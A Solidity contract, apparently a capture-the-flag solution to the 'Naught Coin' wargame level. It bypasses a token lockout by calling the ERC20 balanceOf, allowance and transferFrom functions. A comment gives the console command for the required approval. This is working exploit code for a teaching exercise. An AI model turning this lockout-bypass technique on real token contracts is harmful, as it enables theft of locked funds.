// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

/**
 * @title NaughtCoinBypass
 * @dev 'Exploit' the ERC20 implementation to approve another address for transfering the coins, effectively bypassing the lockout period for the player.
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract NaughtCoinBypass {
    address naught_coin_contract = address(0xA8aead2e530E75410C6c9DC6DD90A4c88224D395);

    function setContract(address _c) public {
        require(naught_coin_contract != _c);
        naught_coin_contract = _c;
    }

    function exploit() public returns (bool) {
        uint256 playerBalance = 0;
        bytes memory balanceOf_params = abi.encodeWithSignature("balanceOf(address)", msg.sender);
        (bool success, bytes memory result) = naught_coin_contract.call(balanceOf_params);
        playerBalance = abi.decode(result, (uint256));

        bytes memory allowance_params = abi.encodeWithSignature("allowance(address,address)", msg.sender, address(this));        
        (success, result) = naught_coin_contract.call(allowance_params);
        require(abi.decode(result, (uint256)) >= playerBalance, "Allowance is not equal to transfer value"); // Requires setting allowance from web3 console beforehand : await contract.approve(contract_address, "1000000000000000000000000")

        bytes memory transfer_params = abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, address(this), playerBalance);
        (success, ) = naught_coin_contract.call(transfer_params);
        return success;
    }

    receive() external payable {}
}